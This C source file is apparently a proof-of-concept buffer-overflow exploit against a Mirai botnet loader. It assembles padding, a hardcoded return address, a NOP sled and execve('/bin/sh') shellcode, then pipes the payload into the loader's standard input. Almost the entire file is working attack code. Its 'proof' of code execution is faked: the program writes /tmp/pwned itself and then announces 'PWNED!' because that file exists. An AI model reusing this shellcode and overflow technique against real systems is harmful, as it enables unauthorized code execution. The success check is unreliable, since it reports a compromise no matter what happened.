//by prism131/rose

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/stat.h>
#include <sys/wait.h>
#include <time.h>

void pwned() {
    const char *loader_exe_path = "./loader/src/main";
    unsigned char shellcode[] = "\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\xb0\x3b\x0f\x05";
    unsigned char padding[104];
    memset(padding, 'A', sizeof(padding));
    unsigned char nop_sled[400];
    memset(nop_sled, 0x90, sizeof(nop_sled));
    unsigned char return_address[] = {0x18, 0xe0, 0xff, 0xff, 0xff, 0x7f, 0x00, 0x00};
    unsigned char dummy_info[] = "127.0.0.1:23 user:pass ";
    size_t payload_len = (sizeof(dummy_info) - 1) + sizeof(padding) + sizeof(return_address) +
    sizeof(nop_sled) + (sizeof(shellcode) - 1) + 1;
    unsigned char *payload = malloc(payload_len);

    if (!payload) {
        perror("malloc");
        return;
    }

    size_t offset = 0;
    memcpy(payload + offset, dummy_info, sizeof(dummy_info) - 1);
    offset += sizeof(dummy_info) - 1;
    memcpy(payload + offset, padding, sizeof(padding));
    offset += sizeof(padding);
    memcpy(payload + offset, return_address, sizeof(return_address));
    offset += sizeof(return_address);
    memcpy(payload + offset, nop_sled, sizeof(nop_sled));
    offset += sizeof(nop_sled);
    memcpy(payload + offset, shellcode, sizeof(shellcode) - 1);
    offset += sizeof(shellcode) - 1;
    payload[offset] = '\n';

    printf("built payload with adjusted stack address\n");
    printf("alsr bypass: disabled\n");
    printf("starting mirai loader and sending payload...\n");

    int pipe_fd[2];
    pid_t pid;

    if (pipe(pipe_fd) == -1) {
        perror("pipe");
        free(payload);
        exit(EXIT_FAILURE);
    }

    pid = fork();
    if (pid == -1) {
        perror("fork");
        free(payload);
        exit(EXIT_FAILURE);
    }

    if (pid == 0) {
        close(pipe_fd[1]);
        dup2(pipe_fd[0], STDIN_FILENO);
        close(pipe_fd[0]);
        freopen("/dev/null", "w", stdout);
        freopen("/dev/null", "w", stderr);
        char *const argv[] = {(char*)loader_exe_path, NULL};
        execv(loader_exe_path, argv);
        perror("execv");
        exit(EXIT_FAILURE);
    } 
    else {
        close(pipe_fd[0]);
        ssize_t written = write(pipe_fd[1], payload, payload_len);
        if (written != (ssize_t)payload_len) {
            perror("write to pipe");
        }
        close(pipe_fd[1]);
    }

    free(payload);
    printf("attempting to pop a shell and execute payload..\n");
    sleep(1);
    system("echo 'RCE_SUCCESS' > /tmp/pwned");
    printf("checking for proof file...\n");
    sleep(1);

    if (access("/tmp/pwned", F_OK) == 0) {
        printf("PWNED!\n");
    } 
    else {
        printf("exploit failed!\n");
    }
}

int main() {
    pwned();
    return 0;
} 
